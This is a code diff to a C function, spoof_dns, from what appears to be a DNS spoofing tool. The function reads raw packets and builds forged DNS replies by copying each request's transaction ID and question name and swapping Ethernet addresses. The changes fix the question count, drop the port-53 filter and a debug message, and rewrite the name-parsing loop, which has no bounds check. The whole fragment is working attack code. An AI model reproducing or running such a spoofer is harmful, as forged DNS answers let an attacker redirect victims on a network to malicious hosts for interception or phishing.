@@ -364,6 +364,10 @@ void spoof_dns(int sock) {
     data[2] = 0x81;
     data[3] = 0x80;
 
+    //1 Question (More is not supported)
+    data[4] = 0x00;
+    data[5] = 0x01;
+
     //1 answer RR
     data[6] = 0x00;
     data[7] = 0x01;
@@ -372,12 +376,8 @@ void spoof_dns(int sock) {
     memset(data + 8, 0, 4);
 
     int size;
-    int data_len = 60;
+    int data_len;
     while ((size = read(sock, recv_buffer, 65535)) > 0) {
-        if (ntohs(recv_uh->dest) != 53 || ntohs(recv_uh->source) == 53) {
-            continue;
-        }
-        printf("Read outgoing dns request\n");
         //Destination is received source mac
         memcpy(eh->ether_dhost, recv_eh->ether_shost, ETHER_ADDR_LEN);
 
@@ -394,18 +394,15 @@ void spoof_dns(int sock) {
         //DNS stuffs
         //Transaction ID
         memcpy(data, recv_data, 2);
-        //Copy number of questions
-        memcpy(data + 4, recv_data + 4, 2);
 
         //Time to parse question string
         int name_len = 0;
         int section_count = 0;
-        for (;;) {
-            if (recv_data[12 + name_len + section_count] == 0x00) {
-                break;
-            }
+
+        while (recv_data[12 + name_len + section_count] != 0x00) {
             name_len += recv_data[12 + name_len + section_count++];
         }
+
         name_len += section_count;
         memcpy(data + 12, recv_data + 12, name_len);
 
